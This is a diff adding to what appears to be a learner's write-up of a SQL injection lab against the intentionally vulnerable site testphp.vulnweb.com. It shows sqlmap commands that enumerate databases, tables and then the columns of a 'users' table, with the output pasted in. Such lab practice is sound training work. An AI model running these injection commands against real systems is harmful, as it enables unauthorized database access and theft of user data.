@@ -171,3 +171,29 @@ first i used tool is sql map
 
 
 sqlmap http://testphp.vulnweb.com/listproducts.php?cat=1 -dbs
+
+![Screenshot_2024-12-10_15_22_49](https://github.com/user-attachments/assets/2f2f9ea3-2964-4b72-bc21-6fb2c9c5e2e6)
+1.we find data retrive from a database
+[*] acuart
+[*] information_schema
+
+![Screenshot_2024-12-10_15_22_49](https://github.com/user-attachments/assets/2f2f9ea3-2964-4b72-bc21-6fb2c9c5e2e6)
+Database: acuart
+[8 tables]
++-----------+
+| artists   |
+| carts     |
+| categ     |
+| featured  |
+| guestbook |
+| pictures  |
+| products  |
+| users     |
++-----------+
+
+
+
+
+
+
+sqlmap http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users -columns
